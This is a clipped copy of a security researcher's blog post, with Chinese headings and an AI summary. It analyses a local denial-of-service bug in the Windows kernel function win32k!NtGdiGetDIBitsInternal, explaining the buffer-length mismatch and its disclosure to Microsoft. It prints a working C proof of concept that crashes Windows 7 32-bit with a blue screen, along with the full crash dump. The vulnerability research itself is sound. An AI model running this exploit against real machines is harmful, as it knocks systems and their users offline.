---
title: "Windows Kernel Local Denial-of-Service #5: win32k!NtGdiGetDIBitsInternal (Windows 7-10)"
source: https://j00ru.vexillium.org/2017/04/windows-kernel-local-denial-of-service-5/
source_host: j00ru.vexillium.org
clip_date: 2026-09-09T00:10:49+08:00
trace_id: 56e2c4b7-f149-448a-ade1-933f20ded5ff
content_hash: 0aa0b9f49de1e456948fd9a4f5929f075195f08030dca66315bd24798c4f6301
status: synced
tags:
  - 漏洞分析
  - 内核
series: null
feed_source: j00ru
ai_summary: win32k!NtGdiGetDIBitsInternal 只用 cjMaxBits 锁定输出内存，内部 RLE 编码却按 biSizeImage 写入，长度不一致可致越界访问并 BSoD。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3d575244-d011-8176-b7aa-d36c85bdd22b
ioc:
  cves:
    - CVE-2017-0058
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> win32k!NtGdiGetDIBitsInternal 只用 cjMaxBits 锁定输出内存，内部 RLE 编码却按 biSizeImage 写入，长度不一致可致越界访问并 BSoD。
> 
> - **漏洞位置：** `win32k!NtGdiGetDIBitsInternal` 是早期 Windows NT 就有的系统调用，被 GetDIBits、BitBlt、StretchBlt 使用，标题标注影响 Windows 7-10。
> - **根因：** 外层以非零 `cjMaxBits` 锁定 `pjBits` 输出区，内部 `EncodeRLE4/8` 却按 `bmiHeader.biSizeImage` 写入；当 `biSizeImage` 更大时可越界写锁定区。
> - **后果：** `ProbeForWrite` 后内核绕过 try/except，越界立即触发未处理异常蓝屏；越界线性且目标在 ring-3，故仅本地 DoS，无法提权。
> - **披露：** 该问题与 CVE-2017-0058 一起报给微软，但因低严重性未达到安全公告门槛。
> - **PoC 实测：** Win7 32 位使用系统调用号 0x10b3，设 cjMaxBits=1 但 biSizeImage=0x10000000，崩溃地址 `win32k!EncodeRLE8+0x1ac`，Bugcheck 0x8E。

Today I’ll discuss yet another way to bring the Windows operating system down from the context of an unprivileged user, in a 5 th and final post in the series. It hardly means that this is the last way to crash the kernel or even the last way that I’m aware of, but covering these bugs indefinitely could soon become boring and quite repetitive, so I’ll stop here and return with other interesting material in the near future. Links to the previous posts about Windows DoS issues are listed below:

## 系列回顾

-   [Windows Kernel Local Denial-of-Service #4: nt!NtAccessCheck and family (Windows 8-10)](https://j00ru.vexillium.org/?p=3225)
-   [Windows Kernel Local Denial-of-Service #3: nt!NtDuplicateToken (Windows 7-8)](https://j00ru.vexillium.org/?p=3187)
-   [Windows Kernel Local Denial-of-Service #2: win32k!NtDCompositionBeginFrame (Windows 8-10)](https://j00ru.vexillium.org/?p=3151)
-   [Windows Kernel Local Denial-of-Service #1: win32k!NtUserThunkedMenuItemInfo (Windows 7-10)](https://j00ru.vexillium.org/?p=3101)

## 漏洞函数背景

The bug explained today can be found in the `win32k!NtGdiGetDIBitsInternal` system call, which has been around since the very early days of Windows existence (at least Windows NT). The syscall is used by the [GetDIBits](https://msdn.microsoft.com/en-us/library/windows/desktop/dd144879\(v=vs.85\).aspx), [BitBlt](https://msdn.microsoft.com/en-us/library/windows/desktop/dd183370\(v=vs.85\).aspx) and [StretchBlt](https://msdn.microsoft.com/en-us/library/windows/desktop/dd145120\(v=vs.85\).aspx) documented API functions, and has been recently subject to patching in Microsoft’s April Patch Tuesday, in order to fix an unrelated double-fetch vulnerability reported by Project Zero (CVE-2017-0058, [issue #1078](https://bugs.chromium.org/p/project-zero/issues/detail?id=1078) in the tracker). The DoS problem was also reported to the vendor at that time, but due to its low severity, it didn’t meet the bar for a security bulletin.

The purpose of the function is to acquire bitmap data based on a Device Context, HBITMAP object, starting scan line, number of scan lines, a BITMAPINFO header and an output buffer. This is illustrated by the following function declaration present in the [ReactOS sources](https://doxygen.reactos.org/da/d77/dibobj_8c_source.html):

```
INT
APIENTRY
NtGdiGetDIBitsInternal(
    _In_ HDC hdc,
    _In_ HBITMAP hbm,
    _In_ UINT iStartScan,
    _In_ UINT cScans,
    _Out_writes_bytes_opt_(cjMaxBits) LPBYTE pjBits,
    _Inout_ LPBITMAPINFO pbmi,
    _In_ UINT iUsage,
    _In_ UINT cjMaxBits,
    _In_ UINT cjMaxInfo)
```

This declaration suggests that a maximum of `cjMaxBits` bytes can be written to the `pjBits` output memory area. The conclusion seems to be correct after taking a look at the actual implementation of the function in win32k.sys, where we can find the following code snippet:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dcc02ed9f6df2d53.png)

## 内存锁定机制

As shown above, if the value of the `cjMaxBits` argument is non-zero, it is prioritized over the return value of the `GreGetBitmapBitsSize` routine. It is also interesting to note that after performing an initial validation of the `pjBits` pointer with a `ProbeForWrite` call, the user-mode memory region spanning from `pjBits` to `pjBits+cjMaxBits-1` is locked, so it cannot be unmapped or restricted beyond the `PAGE_READWRITE` access rights. By doing so, the kernel makes sure that all subsequent read/write accesses to that area are safe (i.e. won’t trigger an exception) until a corresponding `MmUnsecureVirtualMemory` call, which in turn allows it to skip setting up a very broad try/except block over the entire logic of the system call, or using a temporary buffer. On the other hand, the logic is very reliant on the specific number of bytes being locked in memory, so if the kernel later tries to dereference even a single byte outside of the secured user-mode region, it is risking triggering an unhandled exception and an accompanying Blue Screen of Death.

The core of the syscall logic resides in an internal `GreGetDIBitsInternal` function:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/90d92b0c3bba007c.png)

which further calls `GreGetDIBitsInternalWorker`. In that routine, the bitmap pixels actually copied into the user-mode output buffer. One special corner case is when the caller requests the output data to be RLE-compressed through the `pbmi->bmiHeader.biCompression` field, which yields the following additional calls to `EncodeRLE4` or `EncodeRLE8:`

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/dbd93fbe20371da2.png)

## 根因：长度不一致

Here, the 2 nd argument is the pointer to locked user-mode memory, and the 5 th argument is the maximum number of bytes which can be written to it. The inconsistency is quite obvious: while `NtGdiGetDIBitsInternal` uses `cjMaxBits` (if it’s non-zero) as the maximum buffer length, the internal `EncodeRLE` functions use another value passed through an input structure field (`bmi->bmiHeader.biSizeImage`). If the former is smaller than the latter, and the size of the requested data is sufficiently large, it is possible to make `EncodeRLE` access bytes outside of the protected region, thus generating the desired unhandled kernel exception. Notably, this condition can only lead to a local DoS, since the buffer overflow is linear, and the buffer itself is guaranteed to be located in ring-3 memory with the initial `ProbeForWrite` call. Nonetheless, I find the flaw interesting, as it demonstrates the importance of consistency in kernel data processing, especially where buffer lengths are involved.

## PoC 触发代码

A functional proof-of-concept code is quite simple and can be found below. It works on Windows 7 32-bit (due to a hardcoded syscall number) and expects an input bitmap in the test.bmp file. We used a 100 x 100 x 24bpp white image for testing purposes. The essence of the bug is visible in lines 42 and 57 – only a single byte of the output buffer is secured, but the kernel may write as many as 0x10000000.

```objectivec
#include <Windows.h>
#include <assert.h>

// For native 32-bit execution.
extern "C"
ULONG CDECL SystemCall32(DWORD ApiNumber, ...) {
  __asm{mov eax, ApiNumber};
  __asm{lea edx, ApiNumber + 4};
  __asm{int 0x2e};
}

int main() {
  // Windows 7 32-bit.
  CONST ULONG __NR_NtGdiGetDIBitsInternal = 0x10b3;

  // Initialize the graphic subsystem for this process.
  LoadLibraryA("gdi32.dll");

  // Load an external bitmap as HBITMAP and select it in the device context.
  HDC hdc = CreateCompatibleDC(NULL);
  HBITMAP hbmp = (HBITMAP)LoadImage(NULL, L"test.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);

  assert(hdc != NULL);
  assert(hbmp != NULL);

  SelectObject(hdc, hbmp);

  // Allocate a 4-byte buffer for the output data.
  LPBYTE lpNewRegion = (LPBYTE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  assert(lpNewRegion != NULL);

  memset(lpNewRegion, 0xcc, 0x1000);
  LPBYTE output_buffer = &lpNewRegion[0xffc];

  // Trigger the vulnerability.
  BITMAPINFOHEADER bmi = { sizeof(BITMAPINFOHEADER), // biSize
                           100,                      // biWidth
                           100,                      // biHeight
                           1,                        // biPlanes
                           8,                        // biBitcount
                           BI_RLE8,                  // biCompression
                           0x10000000,               // biSizeImage
                           0,                        // biXPelsPerMeter
                           0,                        // biYPelsPerMeter
                           0,                        // biClrUsed
                           0,                        // biClrImportant
  };

  SystemCall32(__NR_NtGdiGetDIBitsInternal,
               hdc,
               hbmp,
               0,
               1,
               output_buffer,
               &bmi,
               DIB_RGB_COLORS,
               1,
               sizeof(bmi)
              );

  return 0;
}
```

Starting the program gives us the expected result in the form of a BSoD:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5d1ada823b788f8b.png)

## 蓝屏崩溃分析

The full crash summary is as follows:

```text
KERNEL_MODE_EXCEPTION_NOT_HANDLED (8e)
This is a very common bugcheck.  Usually the exception address pinpoints
the driver/function that caused the problem.  Always note this address
as well as the link date of the driver/image that contains this address.
Some common problems are exception code 0x80000003.  This means a hard
coded breakpoint or assertion was hit, but this system was booted
/NODEBUG.  This is not supposed to happen as developers should never have
hardcoded breakpoints in retail code, but ...
If this happens, make sure a debugger gets connected, and the
system is booted /DEBUG.  This will let us see why this breakpoint is
happening.
Arguments:
Arg1: c0000005, The exception code that was not handled
Arg2: 8ef2584c, The address that the exception occurred at
Arg3: 949e19a0, Trap Frame
Arg4: 00000000

Debugging Details:
------------------


EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.

FAULTING_IP: 
win32k!EncodeRLE8+1ac
8ef2584c c60300          mov     byte ptr [ebx],0

TRAP_FRAME:  949e19a0 -- (.trap 0xffffffff949e19a0)
ErrCode = 00000002
eax=000f1002 ebx=000f1000 ecx=00000004 edx=fb8d4f61 esi=00000064 edi=fb8d4efc
eip=8ef2584c esp=949e1a14 ebp=949e1a40 iopl=0         nv up ei ng nz ac pe cy
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010297
win32k!EncodeRLE8+0x1ac:
8ef2584c c60300          mov     byte ptr [ebx],0           ds:0023:000f1000=??
Resetting default scope

DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT

BUGCHECK_STR:  0x8E

PROCESS_NAME:  usermode_oob_w

CURRENT_IRQL:  2

ANALYSIS_VERSION: 6.3.9600.17237 (debuggers(dbg).140716-0327) x86fre

LAST_CONTROL_TRANSFER:  from 816f3dff to 8168f9d8

STACK_TEXT:  
949e0f5c 816f3dff 00000003 c890b2ef 00000065 nt!RtlpBreakWithStatusInstruction
949e0fac 816f48fd 00000003 949e13b0 00000000 nt!KiBugCheckDebugBreak+0x1c
949e1370 816f3c9c 0000008e c0000005 8ef2584c nt!KeBugCheck2+0x68b
949e1394 816c92f7 0000008e c0000005 8ef2584c nt!KeBugCheckEx+0x1e
949e1930 81652996 949e194c 00000000 949e19a0 nt!KiDispatchException+0x1ac
949e1998 8165294a 949e1a40 8ef2584c badb0d00 nt!CommonDispatchException+0x4a
949e1a40 8eddaf69 fb8d4f61 ff0f0ffc 00000064 nt!KiExceptionExit+0x192
949e1b04 8edf8c05 00000028 949e1b5c 949e1b74 win32k!GreGetDIBitsInternalWorker+0x73e
949e1b7c 8ede39cc 06010327 0905032f 00000000 win32k!GreGetDIBitsInternal+0x21b
949e1c08 81651db6 06010327 0905032f 00000000 win32k!NtGdiGetDIBitsInternal+0x250
949e1c08 00e45ba6 06010327 0905032f 00000000 nt!KiSystemServicePostCall
```

Thanks for reading!
